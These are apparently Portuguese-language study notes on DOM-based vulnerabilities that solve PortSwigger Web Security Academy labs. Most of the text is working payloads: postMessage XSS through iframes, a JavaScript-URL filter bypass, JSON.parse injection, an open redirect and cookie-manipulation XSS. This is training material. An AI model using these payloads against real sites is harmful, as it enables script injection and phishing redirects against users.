# Vulnerabilidades DOM-Based

Para identificar essas vulnerabilidades é recomendado utilizar o Browser da PortSwigger com a extensão que identifica esse tipo de exploração.

Também pode-se identificar analisando o código fonte, principalmente de arquivos JavaScript.

<br>

## Laboratórios

**DOM XSS using web messages**

Perceba que a página home contém a função `addEventListener()` que espera uma mensagem web.

Envie isso para a vítima atrás do exploit server:
```
<iframe src="//0a8100fe032e3917c66ead67003c0020.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

<br>
<br>

**DOM XSS using web messages and a JavaScript URL**

O JavaScript contém uma checagem falha usando indexOf() que verifica apenas pelas palavras `http:` ou `https:` em qualquer lugar da mensagem web.
```
<iframe src="https://0a2d00d604a3acfbc67064610056003c.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

<br>
<br>

**DOM XSS using web messages and JSON.parse**
```
<iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

<br>
<br>

**DOM-Based Open Redirection**

Esse é o código-fonte vulnerável:
```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

Exploit:
```
https://0ae900830459749cc2465788006000b5.web-security-academy.net/post?postId=7&url=https://exploit-0ab30006040d744dc2a7561101df00f9.exploit-server.net/exploit#
```

<br>

**DOM-Based Cookie Manipulation**
Observe que a aplicação utilize um cookie no client-side chamado `lastViewedProduct` que tem como valor a URL do último produto que o usuário visitou.

```
<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

Exploit:
```
<iframe src="https://0a1100e803937b60c6874ab7003b00b5.web-security-academy.net/product?productId=1&'><script>print()</script>">
```
